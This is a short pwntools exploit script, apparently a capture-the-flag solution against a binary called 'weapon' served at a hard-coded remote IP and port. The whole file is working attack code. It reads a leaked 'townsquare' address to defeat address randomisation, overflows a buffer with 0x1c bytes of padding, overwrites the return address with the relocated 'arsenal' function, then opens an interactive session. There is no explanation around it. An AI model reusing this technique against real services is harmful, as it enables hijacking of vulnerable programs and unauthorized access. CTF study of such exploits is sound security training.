from pwn import *

binary = context.binary = ELF('./weapon')

#p = process('./weapon')
p = remote('61.28.237.24','30201')

p.recvuntil('Your current location is townsquare with the address ')
add_curr = p.recvline().strip()
add = int(add_curr, 16)

print("address townsquare: ",hex(add))



payload = b'A'*(0x18+4)

offset = add - binary.sym.townsquare

print("offset: ", hex(offset))

payload += p32(binary.sym.arsenal+offset)

p.sendline(payload)

p.interactive()
